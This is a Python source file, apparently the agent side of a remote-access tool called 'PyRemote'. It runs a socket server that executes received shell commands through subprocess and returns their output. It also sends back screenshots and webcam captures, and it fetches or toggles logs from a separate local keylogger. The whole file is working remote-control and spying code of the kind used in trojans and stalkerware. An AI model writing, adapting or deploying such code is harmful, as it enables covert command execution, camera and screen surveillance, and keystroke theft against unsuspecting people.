import socket 
import threading
import os
import pyautogui
import cv2 as cv
import subprocess
import pickle

HEADER = 64 
PORT = 5000
SERVER = "127.0.0.1"
KEYLOGGERADDR = ("127.0.0.1", 5050)
ADDR = (SERVER, PORT)
FORMAT = "utf-8"
DISCONNECTED_MESSAGE = "DISCONNECT"

MAINFOLDER = "PyRemote/"


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


clients = []

try:
    os.mkdir(MAINFOLDER)
except FileExistsError:
    pass


def broadcast(msg: str):
    for client in clients:
        client.send(msg.encode(FORMAT))


def screenshot():
    pyautogui.screenshot(f"{MAINFOLDER}tempimage.png")


def cameraCapture():
    # Initalize OpenCV
    cam_port = 0
    cam = cv.VideoCapture(cam_port)

    result, image = cam.read()

    if result:
        cv.imwrite(f"{MAINFOLDER}tempcapture.png", image)
    else:
        print("No image detected. Please! try again")


def getLogs() -> list[str]:
    # Connect to local keylogger socket
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect(KEYLOGGERADDR)

    # Send message logs, with header
    msg = "logs"
    msg_length = len(msg)
    msg_length = str(msg_length).encode(FORMAT)
    msg_length += b" " * (HEADER - len(msg_length))
    conn.send(msg_length)
    conn.send(msg.encode(FORMAT))

    # Get logs back as a number of logs and strings for each log, then save to logs list
    # Should use pickling
    # Pickling is to be used later
    # Also I don't feel like refactoring, so make a PR if you care enough
    logs = []
    numLogs = int(conn.recv(1024).decode(FORMAT))
    for log in range(numLogs):
        size = int(conn.recv(HEADER).decode(FORMAT))
        logs.append(conn.recv(size).decode(FORMAT))

    return logs


def toggleLogger() -> bytes:
    """Toggles the keylogger and then returns status as bytes"""

    # Connect to local keylogger socket
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect(KEYLOGGERADDR)

    # Send toggle message
    msg = "toggle"
    msg_length = len(msg)
    msg_length = str(msg_length).encode(FORMAT)
    msg_length += b" " * (HEADER - len(msg_length))
    conn.send(msg_length)
    conn.send(msg.encode(FORMAT))

    status: bytes = conn.recv(1024)
    return status

def handleConnection(conn: socket, addr):
    print(f"{addr} has connected!")
    connected = True
    while connected:
        # Receive the header, then decode the message using the length of the message
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            if msg == DISCONNECTED_MESSAGE:
                print(f"{addr} has disconnected!")
                connected = False
                break
            else:
                print(msg)
                if msg[:3] == "cmd":
                    print(f"Remote system running command: {msg[3:]}")
                    output = subprocess.getoutput(msg[3:])
                    msg_length = len(output)
                    msg_length = str(msg_length).encode(FORMAT)
                    # print(msg_length, output)
                    msg_length += b" " * (HEADER - len(msg_length))
                    # print(msg_length)
                    conn.send(msg_length)
                    conn.send(output.encode(FORMAT))
                elif msg == "screenshot":
                    screenshot()
                    temp = open(f"{MAINFOLDER}tempimage.png", "rb")
                    size = os.path.getsize(f"{MAINFOLDER}tempimage.png")
                    conn.send(str(size).encode(FORMAT))
                    data = temp.read()
                    conn.sendall(data)
                elif msg == "capture":
                    cameraCapture()
                    f = open(f"{MAINFOLDER}tempcapture.png", "rb")
                    size = os.path.getsize(f"{MAINFOLDER}tempcapture.png")
                    conn.send(str(size).encode(FORMAT))
                    data = f.read()
                    conn.sendall(data)
                elif msg == "getKeyloggerLogs":
                    logs = getLogs()
                    pickledLogs = pickle.dumps(logs)
                    msg_length = len(pickledLogs)
                    msg_length = str(msg_length).encode(FORMAT)
                    msg_length += b" " * (HEADER - len(msg_length))
                    conn.send(msg_length)
                    conn.send(pickledLogs)
                elif msg == "toggle":
                    status = toggleLogger()
                    conn.send(status)


def main():
    print("Attempting to start server...")
    server.listen()
    print(f"Server listening on {ADDR}")  
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handleConnection, args=(conn, addr))
        thread.start()


if __name__ == "__main__":
    main()
